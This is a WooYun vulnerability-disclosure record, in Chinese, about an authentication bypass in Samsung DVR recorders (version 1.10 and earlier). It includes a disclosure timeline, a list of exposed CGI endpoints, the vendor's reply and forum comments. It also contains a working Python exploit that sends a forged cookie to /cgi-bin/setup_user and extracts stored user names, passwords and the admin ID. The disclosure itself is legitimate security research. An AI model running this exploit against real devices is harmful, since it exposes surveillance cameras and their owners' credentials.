{"id": 8187, "wybug_id": "wooyun-2013-035003", "wybug_title": "三星硬盘录像机1.10权限绕过", "wybug_corp": "三星", "wybug_author": "0ctf", "wybug_date": "2013-08-22 19:14", "wybug_open_date": "2013-11-20 19:15", "wybug_type": "非授权访问/认证绕过", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-08-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-08-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-08-26：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-10-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-10-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-11-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-11-20：\t细节向公众公开  简要描述： 三星硬盘录像机1.10以下所有版本远程访问权限绕过（附exp），可查本地摄像机配置，内容，登陆账号密码 详细说明：  三星录像机采用linux系统，存在一个外网登陆界面，通过httpd和CGI页面来验证用户cookie，分别为DATA1 DATA2 分为base64位编码的用户名和密码，由于CGI界面的一个错误验证导致cookie为任意参数都可以获取，设置，删除本地用户的用户名,密码cgi-bin/setup_user,设置DVR ,摄像机一般配置,信息的设备,存储,设置的NTP服务器,设置许多其他设置CGIs界面地址：\n/cgi-bin/camera_privacy_area/cgi-bin/dev_camera/cgi-bin/dev_devinfo/cgi-bin/dev_devinfo2/cgi-bin/dev_hddalarm/cgi-bin/dev_modechange/cgi-bin/dev_monitor/cgi-bin/dev_pos/cgi-bin/dev_ptz/cgi-bin/dev_remote/cgi-bin/dev_spotout/cgi-bin/event_alarmsched/cgi-bin/event_motion_area/cgi-bin/event_motiondetect/cgi-bin/event_sensordetect/cgi-bin/event_tamper/cgi-bin/event_vldetect/cgi-bin/net_callback/cgi-bin/net_connmode/cgi-bin/net_ddns/cgi-bin/net_event/cgi-bin/net_group/cgi-bin/net_imagetrans/cgi-bin/net_recipient/cgi-bin/net_server/cgi-bin/net_snmp/cgi-bin/net_transprotocol/cgi-bin/net_user/cgi-bin/rec_event/cgi-bin/rec_eventrecduration/cgi-bin/rec_normal/cgi-bin/rec_recopt/cgi-bin/rec_recsched/cgi-bin/restart_page/cgi-bin/setup_admin_setup/cgi-bin/setup_datetimelang/cgi-bin/setup_group/cgi-bin/setup_holiday/cgi-bin/setup_ntp/cgi-bin/setup_systeminfo/cgi-bin/setup_user/cgi-bin/setup_userpwd/cgi-bin/webviewer\n   漏洞证明：  py测试源码：\n#!/usr/bin/env python##三星testimport urllib2import reimport sys if __name__ == \"__main__\":     if len(sys.argv) != 2:        print \"usage: %s [TARGET]\" % sys.argv[0]        sys.exit(1)     ip = sys.argv[1]    headers = {\"Cookie\" : \"DATA1=YWFhYWFhYWFhYQ==\" }     print \"SAMSUNG DVR Authentication Bypass\"    print \"Vulnerability and exploit by Andrea Fabrizi <andrea.fabrizi@gmail.com>\\n\"    print \"Target => %s\\n\" % ip     #Dumping users    print \"##### DUMPING USERS ####\"    req = urllib2.Request(\"http://%s/cgi-bin/setup_user\" % ip, None, headers)    response = urllib2.urlopen(req)    user_found = False     for line in response.readlines():         exp = re.search(\".*<input type=\\'hidden\\' name=\\'nameUser_Name_[0-9]*\\' value=\\'(.*)\\'.*\", line)        if exp:            print exp.group(1),         exp = re.search(\".*<input type=\\'hidden\\' name=\\'nameUser_Pw_[0-9]*\\' value=\\'(.*)\\'.*\", line)        if exp:            print \": \" + exp.group(1)            user_found = True         exp = re.search(\".*<input type=hidden name=\\'admin_id\\' value=\\'(.*)\\'.*\", line)        if exp:            print \"Admin ID => %s\" % exp.group(1)          if not user_found:        print \"No user found.\"\n   修复方案：     版权声明：转载请注明来源 0ctf@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2013-08-23 08:58 厂商回复： 感谢对三星产品的关注，本漏洞我公司已发现，正在修复中。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-08-22 19:59 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  这玩意也上网？    \n     2013-08-22 20:39 |    \t\tgodlong \t\t\t( 实习白帽子  |\t\t\t        Rank:68 漏洞数:7        | 戴着白色帽子的白帽子...)\t\t \n  @xsser 监控部署，肯定得上网啊，硬盘录像机还有DDNS之类的配合下访问权限绕过就危害很大了，千万别在卧室装监控 :)    \n     2013-08-22 21:17 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @godlong 家里刚买了个smart TV    \n     2013-08-23 08:50 |    \t\t骨灰 \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:3        | ）“>new shit<\")\t\t \n  这类的默认密码很多，而且很多可以绕过权限修改    \n     2013-08-23 09:27 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  已经被本公司发现？    \n     2013-11-21 09:20 |    \t\tdpanda \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:2        | 0x41414141)\t\t \n  这不是exploit-db上的么？    \n     2014-04-18 11:24 |    \t\tevil_webshell \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 致力于web层面的安全，热爱黑客技术，正在...)\t\t \n  确实很不错，学习了，外带学习了python编程的技术了。    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}